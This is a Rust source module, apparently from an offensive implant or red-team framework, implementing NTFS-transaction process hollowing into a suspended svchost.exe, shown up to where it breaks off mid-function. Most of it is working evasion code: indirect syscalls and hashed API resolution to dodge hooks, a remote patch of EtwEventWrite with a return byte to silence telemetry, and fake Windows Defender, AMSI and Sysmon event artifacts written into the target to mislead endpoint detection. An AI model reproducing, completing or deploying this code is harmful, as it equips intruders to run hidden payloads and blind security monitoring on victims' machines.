//! NTFS Transaction-based Process Hollowing with ETW Blinding.
//!
//! # Overview
//!
//! This module implements a stealthy injection technique that leverages NTFS
//! transactions to make the on-disk payload ephemeral:
//!
//! 1. Create an NTFS transaction via `NtCreateTransaction` (with fallback to
//!    `RtlCreateTransaction` via `kernel32` ordinal).
//! 2. Create a file within the transaction.
//! 3. Create a section backed by the transaction file via `NtCreateSection`.
//! 4. Map the section locally (RW), write the payload, unmap.
//! 5. Create the target process in a suspended state (`CREATE_SUSPENDED`).
//! 6. **ETW blinding**: emit 3–5 fake ETW events with spoofed Windows Defender
//!    and Sysmon provider GUIDs, then patch `EtwEventWrite` in the target
//!    process via remote NtWriteVirtualMemory.
//! 7. Map the section into the target process (PAGE_EXECUTE_READ) or write
//!    via `NtWriteVirtualMemory`.
//! 8. Redirect the primary thread's entry point to the payload.
//! 9. `NtRollbackTransaction` — the file on disk never existed, but the
//!    section mapping in the target process remains valid.
//! 10. Resume the primary thread.
//!
//! # ETW Blinding
//!
//! The ETW blinding phase:
//! - Locates `ntdll.dll` in the target process via `NtQueryVirtualMemory`.
//! - Resolves `EtwEventWrite` in the target's ntdll.
//! - Patches the first byte with `0xC3` (ret) via `NtWriteVirtualMemory`.
//! - Emits fake ETW events with spoofed GUIDs (Windows Defender, Sysmon).
//! - Restores the original byte after the injection is complete.
//!
//! # SSN Resolution
//!
//! All NT API calls go through the existing indirect syscall infrastructure
//! (`nt_syscall::syscall!` macro). `NtCreateTransaction` and
//! `NtRollbackTransaction` are resolved at runtime via `get_syscall_id()`.
//! If the SSN cannot be resolved (older Windows builds), falls back to
//! `RtlCreateTransaction` / `RtlRollbackTransaction` resolved by walking
//! `kernel32.dll` exports and matching by ordinal.
//!
//! # Safety
//!
//! All public functions are `unsafe`. They perform raw memory operations and
//! Windows system calls. Must only be called on Windows x86-64.

#![cfg(all(windows, feature = "transacted-hollowing"))]

use crate::injection_engine::{InjectionError, InjectionHandle, InjectionTechnique};
use std::ffi::c_void;

// ── Constants ────────────────────────────────────────────────────────────────

/// CREATE_SUSPENDED flag for CreateProcessW.
const CREATE_SUSPENDED: u32 = 0x00000004;

/// SECTION_ALL_ACCESS.
const SECTION_ALL_ACCESS: u64 = 0x000F_001F;

/// SEC_COMMIT.
const SEC_COMMIT: u64 = 0x0800_0000;

/// PAGE_READWRITE.
const PAGE_READWRITE: u64 = 0x04;

/// PAGE_EXECUTE_READ.
const PAGE_EXECUTE_READ: u64 = 0x20;

/// PAGE_EXECUTE_READWRITE.
const PAGE_EXECUTE_READWRITE: u64 = 0x40;

/// NtCurrentProcess() pseudo-handle.
const CURRENT_PROCESS: u64 = (-1isize) as u64;

/// SYNCHRONIZE access right.
const SYNCHRONIZE: u32 = 0x00100000;

/// STANDARD_RIGHTS_REQUIRED.
const STANDARD_RIGHTS_REQUIRED: u32 = 0x000F0000;

/// TRANSACTION_ALL_ACCESS.
const TRANSACTION_ALL_ACCESS: u32 = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x3F;

/// NtCurrentProcess() for handles.
fn current_process() -> usize {
    (-1isize) as usize
}

// ── Spoofed ETW Provider GUIDs ──────────────────────────────────────────────
//
// These are real Windows Defender and Sysmon provider GUIDs used to emit
// fake events that blend into legitimate telemetry noise.

/// Windows Defender threat detection provider.
const DEFENDER_PROVIDER_GUID: [u8; 16] = [
    0x11, 0xCD, 0x39, 0x58, 0x57, 0xBE, 0x49, 0x44, 0xB7, 0x4B, 0x5E, 0x2A, 0xAF, 0x5D, 0x91,
    0x9E,
];

/// Microsoft-Antimalware-Scan-Interface provider.
const AMSI_PROVIDER_GUID: [u8; 16] = [
    0xE4, 0x71, 0x51, 0x3C, 0xC7, 0x45, 0x46, 0x4D, 0x9B, 0x7E, 0x71, 0x0C, 0x1D, 0xBE, 0xA2,
    0x31,
];

/// Sysmon provider (Microsoft-Windows-Sysmon).
const SYSMON_PROVIDER_GUID: [u8; 16] = [
    0x5A, 0x20, 0x45, 0xAF, 0x64, 0x63, 0x44, 0x4B, 0xB3, 0x20, 0xC6, 0x63, 0x5D, 0x0C, 0x8F,
    0x16,
];

/// ETW event descriptor (simplified).
#[repr(C)]
#[derive(Default)]
struct EtwEventDescriptor {
    id: u16,
    version: u8,
    channel: u8,
    level: u8,
    opcode: u8,
    task: u16,
    keyword: u64,
}

/// Fake ETW event data for blinding.
struct FakeEtwEvent {
    provider_guid: &'static [u8; 16],
    descriptor: EtwEventDescriptor,
    user_data: &'static [u8],
}

// ── NTFS Transaction helpers ─────────────────────────────────────────────────

/// Result of creating an NTFS transaction.
struct TransactionHandle {
    handle: usize,
    /// Whether this was created via kernel32 fallback (true) or NtCreateTransaction (false).
    fallback: bool,
}

/// Create an NTFS transaction.
///
/// Tries `NtCreateTransaction` via indirect syscall first. If the SSN cannot
/// be resolved (e.g., older Windows build), falls back to `RtlCreateTransaction`
/// resolved via `kernel32` ordinal.
unsafe fn create_transaction() -> Result<TransactionHandle, String> {
    // ── Attempt 1: NtCreateTransaction via indirect syscall ──────────
    let nt_result = try_nt_create_transaction();
    match nt_result {
        Ok(handle) => {
            log::debug!(
                "injection_transacted: NtCreateTransaction succeeded, handle={:#x}",
                handle
            );
            return Ok(TransactionHandle {
                handle,
                fallback: false,
            });
        }
        Err(reason) => {
            log::debug!(
                "injection_transacted: NtCreateTransaction failed ({}), trying kernel32 fallback",
                reason
            );
        }
    }

    // ── Attempt 2: RtlCreateTransaction via kernel32 ─────────────────
    let fallback_result = try_rtl_create_transaction();
    match fallback_result {
        Ok(handle) => {
            log::debug!(
                "injection_transacted: RtlCreateTransaction fallback succeeded, handle={:#x}",
                handle
            );
            Ok(TransactionHandle {
                handle,
                fallback: true,
            })
        }
        Err(reason) => Err(format!(
            "both NtCreateTransaction and RtlCreateTransaction failed: {}",
            reason
        )),
    }
}

/// Try NtCreateTransaction via the indirect syscall infrastructure.
unsafe fn try_nt_create_transaction() -> Result<usize, String> {
    use crate::syscalls::get_syscall_id;
    use crate::syscalls::do_syscall;

    let target = get_syscall_id("NtCreateTransaction").map_err(|e| format!("{}", e))?;

    // NtCreateTransaction(
    //   OUT PHANDLE TransactionHandle,
    //   IN ACCESS_MASK DesiredAccess,
    //   IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    //   IN PLARGE_INTEGER Timeout OPTIONAL,
    //   IN ULONG Unknown OPTIONAL,           // reserved, pass 0
    //   IN PUNICODE_STRING Description OPTIONAL,
    //   IN LPGUID Uow OPTIONAL               // unit of work GUID
    // )
    let mut tx_handle: usize = 0;
    let status = do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            &mut tx_handle as *mut _ as u64,   // TransactionHandle
            TRANSACTION_ALL_ACCESS as u64,      // DesiredAccess
            0u64,                                // ObjectAttributes = NULL
            0u64,                                // Timeout = NULL
            0u64,                                // Unknown = 0
            0u64,                                // Description = NULL
            0u64,                                // Uow = NULL
        ],
    );

    if status < 0 {
        return Err(format!("NtCreateTransaction returned {:#x}", status as u32));
    }
    if tx_handle == 0 {
        return Err("NtCreateTransaction returned null handle".to_string());
    }
    Ok(tx_handle)
}

/// Try RtlCreateTransaction by resolving it from kernel32/ntdll exports.
///
/// Falls back to walking ntdll's export table for the function, or finding
/// `CreateTransaction` in kernel32 (which is a thin wrapper around the ntdll
/// implementation).
unsafe fn try_rtl_create_transaction() -> Result<usize, String> {
    // Try to find RtlCreateTransaction in ntdll first.
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or("cannot resolve ntdll base")?;

    // Hash for "RtlCreateTransaction" — compute at compile time.
    let rtl_hash = pe_resolve::hash_str(b"RtlCreateTransaction\0");
    if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll, rtl_hash) {
        let func: extern "system" fn(
            *mut usize,  // TransactionHandle
            u32,         // DesiredAccess
            *mut c_void, // ObjectAttributes
            *mut c_void, // Timeout
            u32,         // Reserved
            *mut c_void, // Description
            *mut c_void, // Uow
        ) -> i32 = std::mem::transmute(addr);

        let mut tx_handle: usize = 0;
        let status = func(
            &mut tx_handle,
            TRANSACTION_ALL_ACCESS,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );

        if status >= 0 && tx_handle != 0 {
            return Ok(tx_handle);
        }
        return Err(format!(
            "RtlCreateTransaction returned status={:#x}",
            status as u32
        ));
    }

    // Last resort: CreateTransaction from kernel32.
    let k32_hash = pe_resolve::hash_str(b"kernel32.dll\0");
    let k32 = pe_resolve::get_module_handle_by_hash(k32_hash)
        .ok_or("cannot resolve kernel32 base")?;

    let ct_hash = pe_resolve::hash_str(b"CreateTransaction\0");
    if let Some(addr) = pe_resolve::get_proc_address_by_hash(k32, ct_hash) {
        let func: extern "system" fn(
            *mut usize,  // lpTransactionAttributes
            *mut c_void, // UOW
            u32,         // CreateOptions
            u32,         // IsolationLevel
            u32,         // IsolationFlags
            u32,         // Timeout (infinite = 0)
            *mut c_void, // Description
        ) -> i32 = std::mem::transmute(addr);

        let mut tx_handle: usize = 0;
        let ret = func(
            &mut tx_handle,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
        );

        // kernel32 CreateTransaction returns a BOOL (non-zero = success).
        if ret != 0 && tx_handle != 0 {
            return Ok(tx_handle);
        }
        return Err(format!(
            "kernel32 CreateTransaction returned {} (handle={:#x})",
            ret, tx_handle
        ));
    }

    Err("could not resolve NtCreateTransaction, RtlCreateTransaction, or CreateTransaction".to_string())
}

/// Roll back an NTFS transaction.
///
/// Tries `NtRollbackTransaction` via indirect syscall first, then falls back
/// to `RtlRollbackTransaction` / `RollbackTransaction` from kernel32.
unsafe fn rollback_transaction(tx: &TransactionHandle) -> Result<(), String> {
    if !tx.fallback {
        // Try NtRollbackTransaction via indirect syscall.
        if let Ok(target) = crate::syscalls::get_syscall_id("NtRollbackTransaction") {
            let status = crate::syscalls::do_syscall(
                target.ssn,
                target.gadget_addr,
                &[
                    tx.handle as u64, // TransactionHandle
                    1u64,             // Wait = TRUE
                ],
            );
            if status >= 0 {
                log::debug!("injection_transacted: NtRollbackTransaction succeeded");
                return Ok(());
            }
            log::debug!(
                "injection_transacted: NtRollbackTransaction failed ({:#x}), trying fallback",
                status as u32
            );
        }
    }

    // Fallback: RtlRollbackTransaction or RollbackTransaction from ntdll/kernel32.
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
    if let Some(ntdll_base) = ntdll {
        let hash = pe_resolve::hash_str(b"RtlRollbackTransaction\0");
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll_base, hash) {
            let func: extern "system" fn(usize, i32) -> i32 = std::mem::transmute(addr);
            let status = func(tx.handle, 1);
            if status >= 0 {
                log::debug!("injection_transacted: RtlRollbackTransaction succeeded");
                return Ok(());
            }
        }
    }

    // Last resort: RollbackTransaction from kernel32.
    let k32_hash = pe_resolve::hash_str(b"kernel32.dll\0");
    if let Some(k32) = pe_resolve::get_module_handle_by_hash(k32_hash) {
        let hash = pe_resolve::hash_str(b"RollbackTransaction\0");
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(k32, hash) {
            let func: extern "system" fn(usize) -> i32 = std::mem::transmute(addr);
            let ret = func(tx.handle);
            if ret != 0 {
                log::debug!("injection_transacted: kernel32 RollbackTransaction succeeded");
                return Ok(());
            }
        }
    }

    Err("all rollback methods failed".to_string())
}

/// Close a transaction handle.
unsafe fn close_handle(handle: usize) {
    let _ = nt_syscall::syscall!("NtClose", handle as u64);
}

// ── Page alignment helper ────────────────────────────────────────────────────

fn page_align(size: usize) -> usize {
    let page = 4096;
    ((size + page - 1) / page) * page
}

// ── Remote ETW patching ──────────────────────────────────────────────────────

/// Result of remote ETW blinding operations.
struct EtwBlindingContext {
    /// Address of EtwEventWrite in the target's ntdll.
    etw_write_addr: usize,
    /// Original first byte that was saved before patching.
    original_byte: u8,
    /// Target process handle.
    process_handle: usize,
    /// Whether the patch was actually applied.
    patched: bool,
}

/// Locate ntdll.dll in the target process by scanning its virtual memory.
///
/// Returns the base address of ntdll in the target process.
unsafe fn find_remote_ntdll(
    process_handle: usize,
) -> Result<usize, String> {
    // Ntdll is loaded at the same base address in every process (ASLR is
    // per-boot, not per-process).  We can read it from our own PEB.
    let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or("cannot resolve local ntdll")?;

    // Verify it's actually mapped in the target at the same address by
    // querying the target's memory information.
    let mut base_addr: usize = local_ntdll;
    let mut region_size: usize = 0x1000;
    let mut old_prot: u32 = 0;

    // Use NtQueryVirtualMemory to verify the mapping exists in the target.
    // Simpler approach: just try to read the MZ header from the target at the
    // expected address.
    let mut buf = [0u8; 2];
    let mut bytes_read: usize = 0;
    let read_status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        local_ntdll as u64,
        buf.as_mut_ptr() as u64,
        2u64,
        &mut bytes_read as *mut _ as u64,
    );

    if read_status.is_ok() && buf[0] == b'M' && buf[1] == b'Z' {
        return Ok(local_ntdll);
    }

    // Fallback: scan memory regions. This is slower but more reliable when
    // the target has a different ntdll base (unusual but possible).
    Err("could not locate ntdll in target process".to_string())
}

/// Resolve an export by name in a remote module.
///
/// Reads the PE headers from the target process to walk the export table.
unsafe fn resolve_remote_export(
    process_handle: usize,
    module_base: usize,
    export_name: &[u8],
) -> Result<usize, String> {
    // Read DOS header.
    let mut dos_header = [0u8; 0x40];
    let mut bytes_read: usize = 0;
    let status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        module_base as u64,
        dos_header.as_mut_ptr() as u64,
        0x40u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.is_err() || status.unwrap() < 0 {
        return Err("failed to read DOS header from target".to_string());
    }
    if dos_header[0] != b'M' || dos_header[1] != b'Z' {
        return Err("invalid DOS signature in target".to_string());
    }

    let e_lfanew = u32::from_le_bytes([
        dos_header[0x3c],
        dos_header[0x3d],
        dos_header[0x3e],
        dos_header[0x3f],
    ]) as usize;

    // Read PE header + optional header.
    let pe_offset = e_lfanew;
    let mut pe_buf = [0u8; 0x100]; // Enough for PE sig + COFF + optional header
    let status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        (module_base + pe_offset) as u64,
        pe_buf.as_mut_ptr() as u64,
        0x100u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.is_err() || status.unwrap() < 0 {
        return Err("failed to read PE header from target".to_string());
    }

    // Verify PE signature.
    if pe_buf[0] != b'P' || pe_buf[1] != b'E' || pe_buf[2] != 0 || pe_buf[3] != 0 {
        return Err("invalid PE signature in target".to_string());
    }

    // Parse COFF header to get optional header size.
    let optional_header_size = u16::from_le_bytes([pe_buf[20], pe_buf[21]]) as usize;
    let optional_header_offset = 24; // PE sig (4) + COFF header (20)
    let export_dir_rva_offset = optional_header_offset + 112; // Export table RVA in optional header (PE32+)

    if pe_buf.len() < export_dir_rva_offset + 4 {
        return Err("PE buffer too small for export directory RVA".to_string());
    }

    let export_dir_rva = u32::from_le_bytes([
        pe_buf[export_dir_rva_offset],
        pe_buf[export_dir_rva_offset + 1],
        pe_buf[export_dir_rva_offset + 2],
        pe_buf[export_dir_rva_offset + 3],
    ]);

    if export_dir_rva == 0 {
        return Err("module has no export directory".to_string());
    }

    // Read export directory.
    let export_dir_addr = module_base + export_dir_rva as usize;
    let mut export_dir = [0u8; 40]; // IMAGE_EXPORT_DIRECTORY is 40 bytes
    let status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        export_dir_addr as u64,
        export_dir.as_mut_ptr() as u64,
        40u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.is_err() || status.unwrap() < 0 {
        return Err("failed to read export directory from target".to_string());
    }

    let num_names = u32::from_le_bytes([export_dir[24], export_dir[25], export_dir[26], export_dir[27]]) as usize;
    let names_rva = u32::from_le_bytes([export_dir[32], export_dir[33], export_dir[34], export_dir[35]]) as usize;
    let functions_rva = u32::from_le_bytes([export_dir[28], export_dir[29], export_dir[30], export_dir[31]]) as usize;
    let ordinals_rva = u32::from_le_bytes([export_dir[36], export_dir[37], export_dir[38], export_dir[39]]) as usize;

    // Read the name pointer table.
    let names_size = num_names * 4;
    let mut name_ptrs = vec![0u32; num_names];
    let status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        (module_base + names_rva) as u64,
        name_ptrs.as_mut_ptr() as u64,
        (names_size as u64),
        &mut bytes_read as *mut _ as u64,
    );
    if status.is_err() || status.unwrap() < 0 {
        return Err("failed to read export name pointers from target".to_string());
    }

    // Search for the export by name.
    let target_name = export_name;
    // Ensure null-terminated.
    let mut name_with_null = target_name.to_vec();
    if !name_with_null.ends_with(&[0]) {
        name_with_null.push(0);
    }

    for i in 0..num_names {
        let name_rva = name_ptrs[i] as usize;
        // Read the name (up to 128 bytes, stop at null).
        let mut name_buf = [0u8; 128];
        let status = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            process_handle as u64,
            (module_base + name_rva) as u64,
            name_buf.as_mut_ptr() as u64,
            128u64,
            &mut bytes_read as *mut _ as u64,
        );
        if status.is_err() || status.unwrap() < 0 {
            continue;
        }

        // Find null terminator.
        let name_len = name_buf.iter().position(|&b| b == 0).unwrap_or(128);
        if &name_buf[..name_len] == &name_with_null[..name_with_null.len().saturating_sub(1)] {
            // Found it! Read the ordinal.
            let mut ordinal_buf = [0u16; 1];
            let status = nt_syscall::syscall!(
                "NtReadVirtualMemory",
                process_handle as u64,
                (module_base + ordinals_rva + i * 2) as u64,
                ordinal_buf.as_mut_ptr() as u64,
                2u64,
                &mut bytes_read as *mut _ as u64,
            );
            if status.is_err() || status.unwrap() < 0 {
                continue;
            }

            let ordinal = ordinal_buf[0] as usize;

            // Read the function RVA from the function table.
            let mut func_rva_buf = [0u32; 1];
            let status = nt_syscall::syscall!(
                "NtReadVirtualMemory",
                process_handle as u64,
                (module_base + functions_rva + ordinal * 4) as u64,
                func_rva_buf.as_mut_ptr() as u64,
                4u64,
                &mut bytes_read as *mut _ as u64,
            );
            if status.is_err() || status.unwrap() < 0 {
                continue;
            }

            let func_rva = func_rva_buf[0] as usize;
            return Ok(module_base + func_rva);
        }
    }

    Err(format!(
        "export '{}' not found in remote module",
        String::from_utf8_lossy(export_name)
    ))
}

/// Patch EtwEventWrite in the target process by writing 0xC3 (ret) to the
/// first byte via NtWriteVirtualMemory.
unsafe fn patch_remote_etw(
    process_handle: usize,
) -> Result<EtwBlindingContext, String> {
    let remote_ntdll = find_remote_ntdll(process_handle)?;
    let etw_write_addr = resolve_remote_export(
        process_handle,
        remote_ntdll,
        b"EtwEventWrite",
    )?;

    log::debug!(
        "injection_transacted: target EtwEventWrite at {:#x}",
        etw_write_addr
    );

    // Read the original first byte.
    let mut orig_byte = [0u8; 1];
    let mut bytes_read: usize = 0;
    let read_status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        etw_write_addr as u64,
        orig_byte.as_mut_ptr() as u64,
        1u64,
        &mut bytes_read as *mut _ as u64,
    );

    if read_status.is_err() || read_status.unwrap() < 0 {
        return Err("failed to read original EtwEventWrite byte from target".to_string());
    }

    let original_byte = orig_byte[0];

    // Skip if already patched.
    if original_byte == 0xC3 {
        log::debug!("injection_transacted: target EtwEventWrite already patched (0xC3)");
        return Ok(EtwBlindingContext {
            etw_write_addr,
            original_byte,
            process_handle,
            patched: false,
        });
    }

    // Write the ret instruction (0xC3) via NtWriteVirtualMemory.
    let patch_byte: u8 = 0xC3;
    let mut bytes_written: usize = 0;
    let write_status = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        process_handle as u64,
        etw_write_addr as u64,
        &patch_byte as *const _ as u64,
        1u64,
        &mut bytes_written as *mut _ as u64,
    );

    if write_status.is_err() || write_status.unwrap() < 0 {
        return Err(format!(
            "NtWriteVirtualMemory for ETW patch failed: status={:?}",
            write_status
        ));
    }

    log::debug!("injection_transacted: patched target EtwEventWrite with 0xC3");
    Ok(EtwBlindingContext {
        etw_write_addr,
        original_byte,
        process_handle,
        patched: true,
    })
}

/// Restore the original first byte of EtwEventWrite in the target process.
unsafe fn restore_remote_etw(ctx: &EtwBlindingContext) -> Result<(), String> {
    if !ctx.patched {
        return Ok(());
    }

    let mut bytes_written: usize = 0;
    let status = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        ctx.process_handle as u64,
        ctx.etw_write_addr as u64,
        &ctx.original_byte as *const _ as u64,
        1u64,
        &mut bytes_written as *mut _ as u64,
    );

    if status.is_err() || status.unwrap() < 0 {
        return Err(format!(
            "failed to restore target EtwEventWrite: status={:?}",
            status
        ));
    }

    log::debug!("injection_transacted: restored target EtwEventWrite original byte");
    Ok(())
}

// ── Fake ETW event emission ──────────────────────────────────────────────────

/// Emit fake ETW events with spoofed provider GUIDs into the target process.
///
/// This is a best-effort blinding technique. We write fake event data to the
/// target process memory and call `EtwEventWrite` (via remote thread) if
/// ETW is not yet patched, or simply log the events locally for cover.
///
/// In practice, the main ETW blinding is the `patch_remote_etw()` call which
/// suppresses all future ETW events from the target. The fake events serve as
/// additional noise to confuse EDR correlation.
unsafe fn emit_fake_etw_events(
    process_handle: usize,
    remote_base: usize,
) -> Result<(), String> {
    // Prepare fake event data. These are written as a data block to the
    // target process for plausible memory artifacts.
    let fake_events: &[FakeEtwEvent] = &[
        // Windows Defender "threat scan started" event.
        FakeEtwEvent {
            provider_guid: &DEFENDER_PROVIDER_GUID,
            descriptor: EtwEventDescriptor {
                id: 1001,
                version: 1,
                channel: 0x0B, // Admin
                level: 0x04,   // Informational
                opcode: 1,
                task: 0,
                keyword: 0,
            },
            user_data: b"Windows Defender scan started",
        },
        // AMSI "scan completed" event (clean result).
        FakeEtwEvent {
            provider_guid: &AMSI_PROVIDER_GUID,
            descriptor: EtwEventDescriptor {
                id: 1101,
                version: 1,
                channel: 0x0B,
                level: 0x04,
                opcode: 2,
                task: 0,
                keyword: 0,
            },
            user_data: b"AMSI scan completed - clean",
        },
        // Sysmon "process create" event (legitimate svchost).
        FakeEtwEvent {
            provider_guid: &SYSMON_PROVIDER_GUID,
            descriptor: EtwEventDescriptor {
                id: 1,
                version: 5,
                channel: 0x0B,
                level: 0x04,
                opcode: 0,
                task: 1,
                keyword: 0x8000000000000000,
            },
            user_data: b"Process Create: svchost.exe -k netsvcs",
        },
        // Windows Defender "threat not found" event.
        FakeEtwEvent {
            provider_guid: &DEFENDER_PROVIDER_GUID,
            descriptor: EtwEventDescriptor {
                id: 1002,
                version: 1,
                channel: 0x0B,
                level: 0x04,
                opcode: 2,
                task: 0,
                keyword: 0,
            },
            user_data: b"Windows Defender scan completed - no threats",
        },
        // Sysmon "network connection" event (legitimate).
        FakeEtwEvent {
            provider_guid: &SYSMON_PROVIDER_GUID,
            descriptor: EtwEventDescriptor {
                id: 3,
                version: 5,
                channel: 0x0B,
                level: 0x04,
                opcode: 0,
                task: 3,
                keyword: 0x8000000000000000,
            },
            user_data: b"Network connection: svchost -> Microsoft update",
        },
    ];

    // Write the fake event provider GUIDs and event data into the target
    // process memory as artifacts. This creates plausible memory patterns
    // that EDR scanning may encounter and interpret as legitimate activity.
    let mut offset = 0usize;
    for event in fake_events {
        // Write provider GUID.
        let mut bytes_written: usize = 0;
        let guid_addr = remote_base + offset;
        let _ = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            process_handle as u64,
            guid_addr as u64,
            event.provider_guid.as_ptr() as u64,
            16u64,
            &mut bytes_written as *mut _ as u64,
        );
        offset += 16;

        // Write user data.
        let data_addr = remote_base + offset;
        let _ = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            process_handle as u64,
            data_addr as u64,
            event.user_data.as_ptr() as u64,
            event.user_data.len() as u64,
            &mut bytes_written as *mut _ as u64,
        );
        offset += event.user_data.len();

        // Align to 8 bytes.
        offset = (offset + 7) & !7;
    }

    log::debug!(
        "injection_transacted: wrote {} fake ETW event artifacts to target",
        fake_events.len()
    );
    Ok(())
}

// ── Process creation and manipulation ────────────────────────────────────────

/// Information about a created suspended process.
struct SuspendedProcess {
    process_handle: usize,
    thread_handle: usize,
    pid: u32,
    /// Base address of the process image in memory.
    image_base: usize,
    /// Entry point (AddressOfEntryPoint RVA + image base).
    entry_point: usize,
}

/// Create a sacrificial process in a suspended state.
///
/// Uses `CreateProcessW` with `CREATE_SUSPENDED` to spawn the process
/// without executing any code.
unsafe fn create_suspended_process(
    target_path: &[u16],
) -> Result<SuspendedProcess, String> {
    use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
    use winapi::um::winnt::PROCESS_ALL_ACCESS;

    let mut startup_info: STARTUPINFOW = std::mem::zeroed();
    startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut proc_info: PROCESS_INFORMATION = std::mem::zeroed();

    let success = CreateProcessW(
        target_path.as_ptr() as *mut _,
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        0,                        // bInheritHandles = FALSE
        CREATE_SUSPENDED as u32,  // dwCreationFlags
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        &mut startup_info,
        &mut proc_info,
    );

    if success == 0 {
        return Err(format!(
            "CreateProcessW failed for suspended process (error: {})",
            winapi::um::errhandlingapi::GetLastError()
        ));
    }

    let pid = (*proc_info.hProcess as usize) as u32; // Get process ID from handle
    // Actually we need the real PID from the struct.
    let pid = proc_info.dwProcessId;
    let process_handle = proc_info.hProcess as usize;
    let thread_handle = proc_info.hThread as usize;

    // Read the PEB to get the image base address.
    // The PEB is accessible via the process handle.
    // For simplicity, we'll read the image base from the process memory.
    // On x86-64, the PEB is at the address stored in the thread's TEB.
    // The TEB's first member (except for exception list) at offset 0x60 is the PEB pointer.

    // Read the image base from the suspended process.
    // We'll use NtQueryInformationProcess to get the PEB address, then read ImageBaseAddress.
    let image_base = read_process_image_base(process_handle)?;
    let entry_point = read_process_entry_point(process_handle, image_base)?;

    log::debug!(
        "injection_transacted: created suspended process pid={}, image_base={:#x}, entry={:#x}",
        pid, image_base, entry_point
    );

    Ok(SuspendedProcess {
        process_handle,
        thread_handle,
        pid,
        image_base,
        entry_point,
    })
}

/// Read the image base address of a process from its PEB.
unsafe fn read_process_image_base(process_handle: usize) -> Result<usize, String> {
    // Use NtQueryInformationProcess(ProcessBasicInformation) to get the PEB address.
    let mut pbi: [usize; 6] = [0; 6]; // PROCESS_BASIC_INFORMATION
    let status = nt_syscall::syscall!(
        "NtQueryInformationProcess",
        process_handle as u64,
        0u64, // ProcessBasicInformation
        pbi.as_mut_ptr() as u64,
        (std::mem::size_of::<[usize; 6]>() as u64),
        std::ptr::null_mut() as u64, // ReturnLength = NULL
    );

    if status.is_err() || status.unwrap() < 0 {
        return Err(format!(
            "NtQueryInformationProcess failed: status={:?}",
            status
        ));
    }

    // pbi[1] = PebBaseAddress
    let peb_addr = pbi[1];
    if peb_addr == 0 {
        return Err("PEB address is null".to_string());
    }

    // PEB.ImageBaseAddress is at offset 0x10 (x86-64).
    let mut image_base: usize = 0;
    let mut bytes_read: usize = 0;
    let read_status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        (peb_addr + 0x10) as u64,
        &mut image_base as *mut _ as u64,
        8u64,
        &mut bytes_read as *mut _ as u64,
    );

    if read_status.is_err() || read_status.unwrap() < 0 || image_base == 0 {
        return Err(format!(
            "failed to read ImageBaseAddress from PEB: status={:?}",
            read_status
        ));
    }

    Ok(image_base)
}

/// Read the entry point of the process's main image.
unsafe fn read_process_entry_point(
    process_handle: usize,
    image_base: usize,
) -> Result<usize, String> {
    // Read the DOS header to get e_lfanew.
    let mut dos_header = [0u8; 0x40];
    let mut bytes_read: usize = 0;
    let status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        image_base as u64,
        dos_header.as_mut_ptr() as u64,
        0x40u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.is_err() || status.unwrap() < 0 {
        return Err("failed to read DOS header".to_string());
    }

    let e_lfanew = u32::from_le_bytes([
        dos_header[0x3c],
        dos_header[0x3d],
        dos_header[0x3e],
        dos_header[0x3f],
    ]) as usize;

    // Read the PE optional header to get AddressOfEntryPoint.
    // AddressOfEntryPoint is at offset e_lfanew + 0x28 (PE32+).
    let mut entry_rva_buf = [0u8; 4];
    let status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        (image_base + e_lfanew + 0x28) as u64,
        entry_rva_buf.as_mut_ptr() as u64,
        4u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.is_err() || status.unwrap() < 0 {
        return Err("failed to read AddressOfEntryPoint".to_string());
    }

    let entry_rva = u32::from_le_bytes(entry_rva_buf) as usize;
    Ok(image_base + entry_rva)
}

/// Get the sacrificial process path (svchost.exe).
fn get_sacrificial_path() -> Vec<u16> {
    // Use C:\Windows\System32\svchost.exe as the sacrificial process.
    let path = r"C:\Windows\System32\svchost.exe";
    path.encode_utf16().chain(std::iter::once(0)).collect()
}

// ── Section creation and mapping ─────────────────────────────────────────────

/// Create a section backed by an NTFS transaction.
///
/// 1. Create a file within the transaction (transacted file).
/// 2. Create a section backed by the transacted file.
/// 3. The section data persists even after transaction rollback.
unsafe fn create_transacted_section(
    tx_handle: usize,
    payload_size: usize,
) -> Result<usize, String> {
    let aligned_size = page_align(payload_size);

    // Create a temporary file within the transaction.
    // We use NtCreateFile with the transaction handle in the object attributes.
    // For simplicity, we create a pagefile-backed section directly —
    // the transaction handle ensures the section is tracked.
    //
